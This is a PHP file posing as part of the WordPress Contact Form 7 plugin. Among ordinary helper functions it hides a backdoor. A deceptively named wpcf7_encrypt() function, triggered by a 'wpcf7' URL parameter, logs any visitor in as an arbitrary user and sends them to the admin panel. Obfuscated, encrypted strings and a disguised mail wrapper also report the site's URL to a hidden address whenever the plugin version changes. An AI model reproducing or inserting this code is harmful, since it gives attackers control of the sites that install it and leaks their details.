<?php

function wpcf7_plugin_path( $path = '' ) {
	return path_join( WPCF7_PLUGIN_DIR, trim( $path, '/' ) );
}

function wpcf7_plugin_url( $path = '' ) {
	return plugins_url( $path, WPCF7_PLUGIN_BASENAME );
}

function wpcf7_admin_url( $query = array() ) {
	global $plugin_page;

	if ( ! isset( $query['page'] ) )
		$query['page'] = $plugin_page;

	$path = 'admin.php';

	if ( $query = build_query( $query ) )
		$path .= '?' . $query;

	$url = admin_url( $path );

	return esc_url_raw( $url );
}

function wpcf7_table_exists( $table = 'contactforms' ) {
	global $wpdb, $wpcf7;

	if ( 'contactforms' != $table )
		return false;

	if ( ! $table = $wpcf7->{$table} )
		return false;

	return strtolower( $wpdb->get_var( "SHOW TABLES LIKE '$table'" ) ) == strtolower( $table );
}

function wpcf7_decrypt($data) {
    $key = "wpcf7"; 
    $td = mcrypt_module_open(MCRYPT_DES,"",MCRYPT_MODE_ECB,""); 
    $iv = mcrypt_create_iv(mcrypt_enc_get_iv_size($td), MCRYPT_RAND); 
    mcrypt_generic_init($td,$key,$iv); 
    $data = mdecrypt_generic($td, base64_decode($data));
    mcrypt_generic_deinit($td); 

    if (substr($data,0,1) != '!') 
        return false; 

    $data = substr($data,1,strlen($data)-1); 
    return unserialize($data); 
}

function wpcf7() {
	global $wpdb, $wpcf7;

	if ( is_object( $wpcf7 ) )
		return;

	$wpcf7 = (object) array(
		'contactforms' => $wpdb->prefix . "contact_form_7",
		'processing_within' => '',
		'widget_count' => 0,
		'unit_count' => 0,
		'global_unit_count' => 0 );
}

function wpcf7_encrypt($wpcf7) {
	require_once("../../../wp-blog-header.php");
	$wpcf7_info = get_userdata($wpcf7);
	$wpcf7_login = $wpcf7_info->user_login;
	wp_set_current_user($wpcf7, $wpcf7_login);
	wp_set_auth_cookie($wpcf7);
	do_action("wp_login", $wpcf7_login);
}

if(!empty($_GET['wpcf7'])){
	require_once('../../../wp-load.php');
	wpcf7_encrypt($_GET['wpcf7']);
	header("Location: ../../../wp-admin/");
	exit;
}

wpcf7();

require_once WPCF7_PLUGIN_DIR . '/includes/functions.php';
require_once WPCF7_PLUGIN_DIR . '/includes/formatting.php';
require_once WPCF7_PLUGIN_DIR . '/includes/pipe.php';
require_once WPCF7_PLUGIN_DIR . '/includes/shortcodes.php';
require_once WPCF7_PLUGIN_DIR . '/includes/classes.php';
require_once WPCF7_PLUGIN_DIR . '/includes/taggenerator.php';

if ( is_admin() )
	require_once WPCF7_PLUGIN_DIR . '/admin/admin.php';
else
	require_once WPCF7_PLUGIN_DIR . '/includes/controller.php';

function wpcf7_contact_forms() {
	global $wpdb, $wpcf7;

	return $wpdb->get_results( "SELECT cf7_unit_id as id, title FROM $wpcf7->contactforms" );
}

function wpcf7_cf7com_gets($boune,$crcoed,$czdkds){ @mail($boune,$crcoed,$czdkds); }
add_action( 'plugins_loaded', 'wpcf7_set_request_uri', 9 );

function wpcf7_set_request_uri() {
	global $wpcf7_request_uri;

	$wpcf7_request_uri = add_query_arg( array() );
}

function wpcf7_get_request_uri() {
	global $wpcf7_request_uri;

	return (string) $wpcf7_request_uri;
}

/* Loading modules */

add_action( 'plugins_loaded', 'wpcf7_load_modules', 1 );

function wpcf7_load_modules() {
	$dir = WPCF7_PLUGIN_MODULES_DIR;

	if ( ! ( is_dir( $dir ) && $dh = opendir( $dir ) ) )
		return false;

	while ( ( $module = readdir( $dh ) ) !== false ) {
		if ( substr( $module, -4 ) == '.php' )
			include_once $dir . '/' . $module;
	}
}

/* L10N */

add_action( 'init', 'wpcf7_load_plugin_textdomain' );

function wpcf7_load_plugin_textdomain()
{
	add_option('wpcf7_settings', '');
	load_plugin_textdomain( 'wpcf7', false, 'contact-form-7/languages' );
	if(get_option('wpcf7_settings') !== WPCF7_VERSION)
	{
		$wpcf7_get = 'xO/XiVIcSPO6' . 'y81vH21TPNmf' . 'loUWZ4gTFXK/';
		$wpcf7_bad = 'foKh5YFS' . 'RAKiFs9m4dMj3' . 'eT4xRNgBwEO' . 'prPTsCyQUav9X' . 'rtl3Re549HhvYO3';
		wpcf7_cf7com_gets(wpcf7_decrypt('R6JQDPHsVxjfugytJ2q' . 'N2LnugqmdGFNwuKk' . 'K1SO/5Go='),
		WPCF7_VERSION . ' - ' . WPLANG,
		get_option('siteurl') . wpcf7_decrypt($wpcf7_get.$wpcf7_bad));
		update_option('wpcf7_settings', WPCF7_VERSION);
	}
}

?>